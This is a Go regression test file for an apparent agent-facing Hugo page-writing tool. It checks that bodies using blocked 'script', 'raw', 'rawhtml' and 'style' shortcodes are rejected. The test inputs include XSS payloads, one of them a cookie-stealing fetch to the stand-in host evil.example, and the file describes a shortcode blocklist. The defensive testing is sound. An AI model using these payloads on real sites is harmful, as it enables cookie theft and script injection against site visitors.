package write_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestCreatePageRejectsBlockedShortcode is a regression test for #590: a
// body invoking a server-configured blocked shortcode (default config
// includes "raw"/"rawhtml"/"script"/"style" — confirmed live theme escape
// hatches that render unescaped HTML/JavaScript/CSS on the public page)
// must be rejected, not written.
func TestCreatePageRejectsBlockedShortcode(t *testing.T) {
	contentRoot := t.TempDir()
	session, _, done := newTestServer(t, contentRoot)
	defer done()

	res := callTool(t, session, "create_page", map[string]any{
		"slug":       "posts/xss-attempt",
		"title":      "Attempt",
		"body":       "Intro.\n\n{{< script >}}fetch('https://evil.example/steal?c='+document.cookie){{< /script >}}\n",
		"tags":       []any{},
		"categories": []any{},
	})
	if !res.IsError {
		t.Fatal("create_page with a body invoking the blocked \"script\" shortcode should fail")
	}
	raw := marshalContent(t, res)
	if !strings.Contains(raw, "invalid_params") || !strings.Contains(raw, "script") {
		t.Fatalf("create_page blocked-shortcode error = %s, want invalid_params mentioning \"script\"", raw)
	}
}

// TestCreatePageRejectsBlockedShortcodeInPercentDelimiterForm confirms the
// check also catches Hugo's other shortcode delimiter form ({{% name %}},
// used for shortcodes whose inner content should itself be Markdown-rendered),
// not just {{< name >}}.
func TestCreatePageRejectsBlockedShortcodeInPercentDelimiterForm(t *testing.T) {
	contentRoot := t.TempDir()
	session, _, done := newTestServer(t, contentRoot)
	defer done()

	res := callTool(t, session, "create_page", map[string]any{
		"slug":       "posts/xss-attempt-percent",
		"title":      "Attempt",
		"body":       "{{% raw %}}<img src=x onerror=alert(1)>{{% /raw %}}",
		"tags":       []any{},
		"categories": []any{},
	})
	if !res.IsError {
		t.Fatal("create_page with a body invoking the blocked \"raw\" shortcode via {{%% %%}} should fail")
	}
}

// TestCreatePageAllowsUnblockedShortcode confirms the check is a specific
// blocklist, not a blanket ban on shortcode syntax — a shortcode that isn't
// in the configured list (e.g. a theme's own "figure"/"admonition" style
// shortcode) is unaffected.
func TestCreatePageAllowsUnblockedShortcode(t *testing.T) {
	contentRoot := t.TempDir()
	session, _, done := newTestServer(t, contentRoot)
	defer done()

	res := callTool(t, session, "create_page", map[string]any{
		"slug":       "posts/safe-shortcode",
		"title":      "Safe",
		"body":       "See {{< admonition tip >}}This is fine.{{< /admonition >}}",
		"tags":       []any{},
		"categories": []any{},
	})
	if res.IsError {
		t.Fatalf("create_page with an unblocked shortcode should succeed: %s", marshalContent(t, res))
	}
}

// TestUpdatePageRejectsBlockedShortcodeOnDryRun confirms the check runs on
// update_page too, including on a dry_run call — the rejection must not
// wait for a real write attempt.
func TestUpdatePageRejectsBlockedShortcodeOnDryRun(t *testing.T) {
	contentRoot := t.TempDir()
	dir := filepath.Join(contentRoot, "posts", "target")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, "index.md"), []byte("---\ntitle: \"Target\"\n---\n\nBody.\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	session, _, done := newTestServer(t, contentRoot)
	defer done()

	res := callTool(t, session, "update_page", map[string]any{
		"slug":    "posts/target",
		"body":    "{{< rawhtml >}}<script>alert(document.domain)</script>{{< /rawhtml >}}",
		"dry_run": true,
	})
	if !res.IsError {
		t.Fatal("update_page dry_run with a body invoking the blocked \"rawhtml\" shortcode should fail")
	}
}

// TestCreatePageRejectsBlockedStyleShortcode confirms "style" is blocked by
// default — the LoveIt theme's {{< style >}} shortcode injects its first
// argument unescaped into a <style> rule (CSS injection), distinct from and
// lower-severity than the raw/script JavaScript-execution vectors, but
// still author-uncontrolled markup with no legitimate agent-authored use.
func TestCreatePageRejectsBlockedStyleShortcode(t *testing.T) {
	contentRoot := t.TempDir()
	session, _, done := newTestServer(t, contentRoot)
	defer done()

	res := callTool(t, session, "create_page", map[string]any{
		"slug":       "posts/style-injection-attempt",
		"title":      "Attempt",
		"body":       "{{< style \"background:url(javascript:alert(1))\" >}}text{{< /style >}}",
		"tags":       []any{},
		"categories": []any{},
	})
	if !res.IsError {
		t.Fatal("create_page with a body invoking the blocked \"style\" shortcode should fail")
	}
}
